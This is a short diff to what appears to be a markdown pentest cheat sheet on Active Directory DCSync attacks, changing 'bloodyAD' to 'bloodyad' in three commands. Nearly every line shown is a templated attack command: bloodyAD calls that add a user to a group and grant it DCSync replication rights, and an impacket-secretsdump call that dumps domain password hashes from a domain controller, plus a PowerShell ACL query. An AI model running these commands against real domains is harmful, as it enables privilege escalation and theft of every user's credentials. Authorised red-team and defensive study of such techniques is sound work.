@@ -205,9 +205,9 @@ Get-ObjectAcl "DC={{DOMAIN_NB}},DC=LOCAL" -ResolveGUIDs | ? { $_.ObjectAceType -
 > | `89e95b76-444d-4c62-991a-0facbeda640c` | DS-Replication-Get-Changes-In-Filtered-Set |
 
 ```bash
-bloodyAD --host {{DC_IP}} -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' add groupMember '{{GROUP_NAME}}' {{USERNAME}}
-bloodyAD --host {{DC_IP}} -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' get object {{USERNAME}} --attr memberOf
-bloodyAD --host {{DC_IP}} -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' add dcsync {{USERNAME}}
+bloodyad --host {{DC_IP}} -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' add groupMember '{{GROUP_NAME}}' {{USERNAME}}
+bloodyad --host {{DC_IP}} -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' get object {{USERNAME}} --attr memberOf
+bloodyad --host {{DC_IP}} -d {{DOMAIN}} -u {{USERNAME}} -p '{{PASSWORD}}' add dcsync {{USERNAME}}
 
 # Linux — Impacket (dump one user or all)
 impacket-secretsdump -just-dc-user {{TARGET_USER}} {{DOMAIN}}/{{USERNAME}}:"{{PASSWORD}}"@{{DC_IP}}
